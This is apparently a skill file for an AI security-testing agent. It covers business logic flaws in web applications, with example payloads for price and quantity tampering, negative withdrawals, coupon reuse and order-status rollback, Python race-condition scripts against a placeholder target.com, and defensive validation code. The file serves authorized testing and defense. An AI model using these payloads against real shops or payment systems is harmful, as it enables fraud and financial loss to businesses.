---
name: business-logic-testing
description: Professional skills and methodology for business logic vulnerability testing
version: 1.0.0
---

# Business Logic Vulnerability Testing

## Overview

Business logic vulnerabilities are design flaws in an application's business processing flow that can lead to unauthorized operations, data tampering, financial loss and more. This skill provides methods for detecting, exploiting and defending against business logic vulnerabilities.

## Vulnerability Types

### 1. Workflow Bypass

**Skipping verification steps:**
- Access the final step directly
- Change the order of steps
- Repeat a step

### 2. Price Manipulation

**Negative prices:**
- Enter a negative amount
- Causes the account balance to increase

**Price tampering:**
- Modify the front-end price
- Modify the price in the API request

### 3. Quantity Limit Bypass

**Negative quantity:**
- Enter a negative number
- May cause stock to increase

**Exceeding the limit:**
- Modify the quantity limit
- Bypass with bulk operations

### 4. Race Condition

**Concurrent requests:**
- Send multiple requests at once
- Bypass a one-time limit

### 5. State Manipulation

**State rollback:**
- Change a completed order back to pending payment
- Modify the order status

## Testing Methods

### 1. Workflow Analysis

**Identify business processes:**
- Registration flow
- Purchase flow
- Withdrawal flow
- Review/approval flow

**Test step skipping:**
```
Normal flow: step 1 → step 2 → step 3
Test: access step 3 directly
Test: step 1 → step 3 (skip step 2)
```

### 2. Parameter Tampering

**Modify key parameters:**
```http
POST /api/purchase
{
  "product_id": 123,
  "quantity": 1,
  "price": 100.00  # change to 0.01
}
```

**Negative-value test:**
```json
{
  "quantity": -1,
  "price": -100.00
}
```

### 3. Concurrency Testing

**Send requests simultaneously:**
```python
import threading
import requests

def purchase():
    requests.post('https://target.com/api/purchase', 
                  json={'product_id': 123, 'quantity': 1})

# Send 10 requests at once
for i in range(10):
    threading.Thread(target=purchase).start()
```

### 4. State Modification

**Modify order status:**
```http
PATCH /api/order/123
{
  "status": "completed"  # change to completed
}
```

**Roll back the status:**
```http
PATCH /api/order/123
{
  "status": "pending"  # roll back from completed to pending payment
}
```

## Exploitation Techniques

### Price Manipulation

**Negative price:**
```json
{
  "product_id": 123,
  "price": -100.00,
  "quantity": 1
}
```

**Modify the front-end price:**
```javascript
// front-end code
const price = 100.00;

// change to
const price = 0.01;
```

**Modify the price via the API:**
```http
POST /api/checkout
{
  "items": [
    {
      "product_id": 123,
      "price": 0.01,  # original price 100.00
      "quantity": 1
    }
  ]
}
```

### Quantity Limit Bypass

**Negative quantity:**
```json
{
  "product_id": 123,
  "quantity": -10  # may cause stock to increase
}
```

**Exceeding the limit:**
```json
{
  "product_id": 123,
  "quantity": 999999  # exceeds the per-purchase limit
}
```

### Coupon Abuse

**Reuse:**
```http
POST /api/checkout
{
  "coupon": "DISCOUNT50",
  "items": [...]
}

# reuse the same coupon
```

**Inactive coupon:**
```http
POST /api/checkout
{
  "coupon": "EXPIRED_COUPON",  # use an expired coupon
  "items": [...]
}
```

### Withdrawal Vulnerabilities

**Negative withdrawal:**
```json
{
  "amount": -1000.00  # may cause the account balance to increase
}
```

**Exceeding the balance:**
```json
{
  "amount": 999999.00  # exceeds the account balance
}
```

### Race Condition

**Concurrent purchases:**
```python
import threading
import requests

def buy():
    requests.post('https://target.com/api/purchase',
                  json={'product_id': 123, 'quantity': 1})

# Flash sale, concurrent requests
for i in range(100):
    threading.Thread(target=buy).start()
```

## Bypass Techniques

### Front-end Validation Bypass

**Call the API directly:**
- Bypass the front-end JavaScript validation
- Send the API request directly

**Modify the request:**
- Intercept with Burp Suite
- Modify the parameters and send

### Status Code Analysis

**Observe the response:**
- 200 OK - possibly successful
- 400 Bad Request - parameter error
- 403 Forbidden - insufficient permissions
- 500 Internal Server Error - server error

### Error Message Exploitation

**Extract information from error messages:**
```
Error: "Insufficient balance, current balance: 100.00"
→ reveals the account balance
```

## Tool Usage

### Burp Suite

**Using Repeater:**
1. Intercept a business request
2. Modify key parameters
3. Observe the response

**Using Intruder:**
1. Mark the parameters
2. Use a payload list
3. Test in bulk

### Custom Scripts

```python
import requests
import json

def test_price_manipulation():
    # Test price modification
    for price in [0.01, -100, 0, 999999]:
        data = {
            "product_id": 123,
            "price": price,
            "quantity": 1
        }
        response = requests.post('https://target.com/api/purchase',
                                json=data)
        print(f"Price {price}: {response.status_code}")

test_price_manipulation()
```

## Verification and Reporting

### Verification Steps

1. Confirm that the business logic restriction can be bypassed
2. Verify that an unauthorized operation can be performed
3. Assess the impact (financial loss, data tampering, etc.)
4. Record a complete PoC
5. Record confirmed vulnerabilities into the platform via the `report_finding` tool (the platform's only entry point for recording vulnerabilities), with fields covering location, type, severity, reproduction steps / PoC and remediation advice

### Reporting Points

- Vulnerability location and the business process
- The unauthorized operations that can be performed
- Complete exploitation steps and PoC
- Remediation advice (server-side validation, business rule checks, etc.)

## Defenses

### Recommended Approaches

1. **Server-side validation**
   ```python
   def process_purchase(product_id, quantity, price):
       # Get the real price from the database
       real_price = db.get_product_price(product_id)
       
       # Validate the price
       if price != real_price:
           raise ValueError("Price mismatch")
       
       # Validate the quantity
       if quantity <= 0:
           raise ValueError("Invalid quantity")
       
       # Process the purchase
       process_order(product_id, quantity, real_price)
   ```

2. **State machine validation**
   ```python
   class OrderState:
       PENDING = "pending"
       PAID = "paid"
       SHIPPED = "shipped"
       COMPLETED = "completed"
       
       TRANSITIONS = {
           PENDING: [PAID],
           PAID: [SHIPPED],
           SHIPPED: [COMPLETED]
       }
       
       def can_transition(self, from_state, to_state):
           return to_state in self.TRANSITIONS.get(from_state, [])
   ```

3. **Concurrency control**
   ```python
   import threading
   
   lock = threading.Lock()
   
   def process_order(order_id):
       with lock:
           # Check the order status
           order = db.get_order(order_id)
           if order.status != 'pending':
               raise ValueError("Order already processed")
           
           # Process the order
           process(order)
   ```

4. **Business rule validation**
   ```python
   def validate_business_rules(order):
       # Validate the quantity limit
       if order.quantity > MAX_QUANTITY:
           raise ValueError("Quantity exceeds limit")
       
       # Validate the price range
       if order.price <= 0:
           raise ValueError("Invalid price")
       
       # Validate the stock
       if order.quantity > get_stock(order.product_id):
           raise ValueError("Insufficient stock")
   ```

5. **Audit logging**
   ```python
   def log_business_action(user_id, action, details):
       log_entry = {
           "user_id": user_id,
           "action": action,
           "details": details,
           "timestamp": datetime.now()
       }
       db.log_action(log_entry)
   ```

## Notes

- Only perform in an authorized testing environment
- Avoid causing real impact on the business
- Be mindful of differences between business processes
- Watch data consistency while testing
